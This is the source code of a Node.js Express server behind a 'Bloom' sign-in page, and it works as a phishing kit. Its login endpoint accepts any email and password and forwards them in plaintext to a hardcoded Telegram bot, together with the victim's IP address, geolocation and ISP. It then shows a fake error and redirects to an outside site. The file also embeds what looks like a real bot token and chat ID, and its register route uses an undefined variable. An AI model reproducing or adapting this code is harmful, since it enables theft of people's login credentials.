const express = require("express");
const path = require("path");
const https = require("https");

const app = express();
const PORT = process.env.PORT || 3000;
const cors = require("cors");

// ── Telegram config ───────────────────────────────
// Set these as environment variables or replace directly:
const TELEGRAM_BOT_TOKEN =
  process.env.TELEGRAM_BOT_TOKEN ||
  "8388435544:AAEPzbwWubGNZD0hLxH0LJy9KRjEBqwt4Pg";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1003433767852";

// ── Helpers ───────────────────────────────────────

function getGeoInfo(ip) {
  return new Promise((resolve) => {
    const lookupIp =
      ip === "::1" || ip === "127.0.0.1" || ip === "::ffff:127.0.0.1"
        ? "8.8.8.8"
        : ip.replace("::ffff:", "");

    const req = https.get(
      `https://ip-api.com/json/${lookupIp}?fields=status,country,regionName,city,isp`,
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            resolve(JSON.parse(data));
          } catch {
            resolve({});
          }
        });
      }
    );
    req.on("error", () => resolve({}));
    req.setTimeout(5000, () => {
      req.destroy();
      resolve({});
    });
  });
}

function sendTelegram(message) {
  return new Promise((resolve) => {
    const body = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    });
    const options = {
      hostname: "api.telegram.org",
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
      },
    };
    const req = https.request(options, (res) => {
      let resp = "";
      res.on("data", (chunk) => (resp += chunk));
      res.on("end", () => {
        try {
          const p = JSON.parse(resp);
          if (!p.ok) console.error("Telegram error:", p.description);
        } catch {}
        resolve();
      });
    });
    req.on("error", (e) => {
      console.error("Telegram error:", e.message);
      resolve();
    });
    req.write(body);
    req.end();
  });
}

function formatDateTime(date) {
  return date.toLocaleString("en-US", {
    weekday: "short",
    year: "numeric",
    month: "short",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    timeZoneName: "short",
  });
}

// ── Middleware ────────────────────────────────────
app.use(express.json());
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// ── Sign-in link redirect ─────────────────────────
app.get("/signin", (req, res) => {
  const email = req.query.email;
  if (!email) return res.redirect("/");
  res.redirect(`/?email=${encodeURIComponent(email)}`);
});

app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password)
    return res
      .status(400)
      .json({ success: false, message: "Email and password are required." });

  // ── Successful login for ANY email + password ──
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket.remoteAddress ||
    "Unknown";
  const now = new Date();

  // Optional: send a notification (geo lookup is optional)
  getGeoInfo(ip).then(async (geo) => {
    const location =
      geo.status === "success"
        ? `${geo.city}, ${geo.regionName}, ${geo.country}`
        : "Location unavailable";

    const message = `🌸 <b>Bloom — New Sign-In</b>

👤 <b>Email:</b> ${email.trim()}
👤 <b>Password:</b> ${password.trim()}
🕐 <b>Date &amp; Time:</b> ${formatDateTime(now)}
🌍 <b>Location:</b> ${location}
🔌 <b>ISP:</b> ${geo.isp || "Unknown"}
🖥️ <b>IP Address:</b> ${ip.replace("::ffff:", "")}`;

    await sendTelegram(message);
  });

  // Respond with success for any email/password
  return res.json({
    success: true,
    message: "Error, please try again",
    user: { email: email.trim() },
    redirect: `https://micro-s-fe.vercel.app/`,
  });
});

// ── API: Register ─────────────────────────────────
app.post("/api/register", (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res
      .status(400)
      .json({ success: false, message: "Email and password are required." });
  if (users.find((u) => u.email.toLowerCase() === email.trim().toLowerCase()))
    return res.status(409).json({
      success: false,
      message: "An account with this email already exists.",
    });
  users.push({ email: email.trim().toLowerCase(), password });
  return res.status(201).json({ success: true, message: "Account created." });
});

// ── Dashboard placeholder ─────────────────────────
app.get("/dashboard", (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><title>Bloom — Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
    <style>body{font-family:'DM Sans',sans-serif;background:#f5f0eb;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
    .box{background:#fffdfb;border-radius:20px;padding:48px 52px;text-align:center;border:1px solid #e0d8ce;box-shadow:0 4px 40px rgba(90,70,40,.10)}
    h1{font-family:'Cormorant Garamond',serif;font-size:36px;font-weight:400;color:#2c2418;margin-bottom:12px}
    p{color:#8a7d70;font-size:15px}a{color:#4a7c59;text-decoration:none;font-size:14px}a:hover{text-decoration:underline}</style></head>
    <body><div class="box"><h1>🌸 Welcome to Bloom</h1><p>You are signed in.</p><br/><a href="/">← Sign out</a></div></body></html>`);
});

// ── Start ─────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🌸 Bloom server running at http://localhost:${PORT}`);
  console.log(
    `   Telegram: ${
      TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE"
        ? "✓ configured"
        : "⚠  add your BOT_TOKEN and CHAT_ID"
    }\n`
  );
});
